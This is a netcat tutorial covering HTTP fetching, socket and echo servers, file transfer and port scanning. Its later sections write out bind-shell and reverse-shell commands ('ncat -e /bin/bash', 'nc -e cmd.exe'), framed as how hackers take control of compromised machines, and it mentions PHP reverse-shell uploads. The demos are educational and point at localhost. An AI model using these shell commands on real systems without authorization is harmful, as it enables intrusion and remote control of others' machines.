# Netcat

## Telnet
The very first thing netcat can be used as is a telnet program. Lets see how.

`$ nc -v google.com 80`
Now netcat is connected to google.com on port 80 and its time to send some message. Lets try to fetch the index page. For this type "GET index.html HTTP/1.1" and hit the Enter key twice. Remember twice.
```
$ nc -v google.com 80
Connection to google.com 80 port [tcp/http] succeeded!
GET index.html HTTP/1.1

HTTP/1.1 302 Found
Location: http://www.google.com/
Cache-Control: private
Content-Type: text/html; charset=UTF-8
X-Content-Type-Options: nosniff
Date: Sat, 18 Aug 2012 06:03:04 GMT
Server: sffe
Content-Length: 219
X-XSS-Protection: 1; mode=block

<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>302 Moved</TITLE></HEAD><BODY>
<H1>302 Moved</H1>
The document has moved
<A HREF="http://www.google.com/">here</A>.
</BODY></HTML>
```
The output from google.com has been received and echoed on the terminal.

2. Simple socket server
To open a simple socket server type in the following command.

`$ nc -l -v 1234`
The above command means : Netcat listen to TCP port 1234. The -v option gives verbose output for better understanding. Now from another terminal try to connect to port 1234 using telnet command as follows :

```
$ telnet localhost 1234
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
abc
ting tong
```
After connecting we send some test message like abc and ting tong to the netcat socket server. The netcat socket server will echo the data received from the telnet client.
```
$ nc -l -v 5555

Connection from 127.0.0.1 port 5555 [tcp/rplay] accepted
abc
ting tong
```
This is a complete Chatting System. Type something in netcat terminal and it will show up in telnet terminal as well. So this technique can be used for chatting between 2 machines.

Complete ECHO Server

Ncat with the -c option can be used to start a echo server. Source

Start the echo server using ncat as follows

`$ ncat -v -l -p 5555 -c 'while true; do read i && echo [echo] $i; done'`
Now from another terminal connect using telnet and type something. It will be send back with "[echo]" prefixed.
The netcat-openbsd version does not have the -c option. Remember to always use the -v option for verbose output.

Note : Netcat can be told to save the data to a file instead of echoing it to the terminal.

`$ nc -l -v 1234 > data.txt`

## UDP ports

Netcat works with udp ports as well. To start a netcat server using udp ports use the -u option

`$ nc -v -ul 7000`
Connect to this server using netcat from another terminal

`$ nc localhost -u 7000`
Now both terminals can chat with each other.

## File transfer
A whole file can be transferred with netcat. Here is a quick example.

One machine A - Send File
```
$ cat happy.txt | ncat -v -l -p 5555
Ncat: Version 5.21 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:5555
```
In the above command, the cat command reads and outputs the content of happy.txt. The output is not echoed to the terminal, instead is piped or fed to ncat which has opened a socket server on port 5555.

On machine B - Receive File

`$ ncat localhost 5555 > happy_copy.txt`
In the above command ncat will connect to localhost on port 5555 and whatever it receives will be written to happy_copy.txt

Now happy_copy.txt will be a copy of happy.txt since the data being send over port 5555 is the content of happy.txt in the previous command.

Netcat will send the file only to the first client that connects to it. After that its over.
And after the first client closes down connection, netcat server will also close down the connection.

4. Port scanning
Netcat can also be used for port scanning. However this is not a proper use of netcat and a more applicable tool like nmap should be used.
```
$ nc -v -n -z -w 1 192.168.1.2 75-85
nc: connect to 192.168.1.2 port 75 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 76 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 77 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 78 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 79 (tcp) failed: Connection refused
Connection to 192.168.1.2 80 port [tcp/*] succeeded!
nc: connect to 192.168.1.2 port 81 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 82 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 83 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 84 (tcp) failed: Connection refused
nc: connect to 192.168.1.2 port 85 (tcp) failed: Connection refused
```
The "-n" parameter here prevents DNS lookup, "-z" makes nc not receive any data from the server, and "-w 1" makes the connection timeout after 1 second of inactivity.

## Remote Shell/Backdoor
Ncat can be used to start a basic shell on a remote system on a port without the need of ssh. Here is a quick example.

`$ ncat -v -l -p 7777 -e /bin/bash`
The above will start a server on port 7777 and will pass all incoming input to bash command and the results will be send back. The command basically converts the bash program into a server. So netcat can be used to convert any process into a server.

Connect to this bash shell using nc from another terminal

`$ nc localhost 7777`
Now try executing any command like help , ls , pwd etc.

## Windows

On windows machine the cmd.exe (dos prompt program) is used to start a similar shell using netcat. The syntax of the command is same.

C:\tools\nc>nc -v -l -n -p 8888 -e cmd.exe
listening on [any] 8888 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 1182
Now another console can connect using the telnet command

Although netcat though can be used to setup remote shells, is not useful to get an interactive shell on a remote system because in most cases netcat would not be installed on a remote system.

The most effective method to get a shell on a remote machine using netcat is by creating reverse shells.

## Reverse Shells
This is the most powerful feature of netcat for which it is most used by hackers. Netcat is used in almost all reverse shell techniques to catch the reverse connection of shell program from a hacked system.

## Reverse telnet

First lets take an example of a simple reverse telnet connection. In ordinate telnet connection the client connects to the server to start a communication channel.

Your system runs (# telnet server port_number)  =============> Server
Now using the above technique you can connect to say port 80 of the server to fetch a webpage. However a hacker is interested in getting a command shell. Its the command prompt of windows or the terminal of linux. The command shell gives ultimate control of the remote system. Now there is no service running on the remote server to which you can connect and get a command shell.

So when a hacker hacks into a system, he needs to get a command shell. Since its not possible directly, the solution is to use a reverse shell. In a reverse shell the server initiates a connection to the hacker's machine and gives a command shell.

Step 1 : Hacker machine (waiting for incoming connection)
Step 2 : Server ==============> Hacker machine
To wait for incoming connections, a local socket listener has to be opened. Netcat/ncat can do this.
First a netcat server has to be started on local machine or the hacker's machine.

machine A
```
$ ncat -v -l -p 8888
Ncat: Version 6.00 ( http://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
```
The above will start a socket server (listener) on port 8888 on local machine/hacker's machine.

Now a reverse shell has to be launched on the target machine/hacked machine. There are a number of ways to launch reverse shells.

For any method to work, the hacker either needs to be able to execute arbitrary command on the system or should be able to upload a file that can be executed by opening from the browser (like a php script).

In this example we are not doing either of the above mentioned things. We shall just run netcat on the server also to throw a reverse command shell to demonstrate the concept. So netcat should be installed on the server or target machine.

Machine B :
```
$ ncat localhost 8888 -e /bin/bash
```
This command will connect to machine A on port 8888 and feed in the output of bash effectively giving a shell to machine A. Now machine A can execute any command on machine B.

Machine A
```
$ ncat -v -l -p 8888
Ncat: Version 5.21 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 127.0.0.1.
pwd
/home/enlightened
```
In a real hacking/penetration testing scenario its not possible to run netcat on target machine. Therefore other techniques are employed to create a shell. These include uploading reverse shell php scripts and running them by opening them in browser. Or launching a buffer overflow exploit to execute reverse shell payload.
